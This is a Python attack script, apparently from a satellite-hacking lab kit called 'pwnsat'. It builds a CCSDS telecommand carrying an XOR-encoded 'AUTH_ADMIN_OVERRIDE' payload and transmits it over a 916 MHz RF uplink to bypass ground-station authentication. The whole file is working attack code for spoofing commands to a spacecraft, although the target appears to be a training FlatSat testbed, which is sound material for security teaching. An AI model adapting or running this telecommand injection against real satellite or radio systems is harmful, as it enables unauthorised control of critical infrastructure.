#!/usr/bin/env python3
"""
Attack 05: Ground-Station Auth Bypass (RF Variant via Radio 1 RF Uplink)
Transmits XOR encrypted auth bypass telecommand over 916 MHz RF uplink.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from pwnsat_packets import build_ccsds_packet
from pwnsat_rf import FlatSatRF

def main():
    print("[+] Attack 05: Ground-Station Auth Bypass (Over-The-Air RF 916 MHz Variant)")
    rf = FlatSatRF()
    raw_payload = b"AUTH_ADMIN_OVERRIDE"
    xor_key = b"PWNSAT"
    enc_payload = bytes([b ^ xor_key[i % 6] for i, b in enumerate(raw_payload)])

    packet = build_ccsds_packet(apid=0x12, payload=enc_payload)
    print("[*] Transmitting XOR-encrypted auth packet over 916.0 MHz uplink...")
    rf.transmit_rf(packet)
    print("[✓] RF Auth Bypass packet transmitted. NeoPixel LED set to Cyan.")

if __name__ == "__main__":
    main()
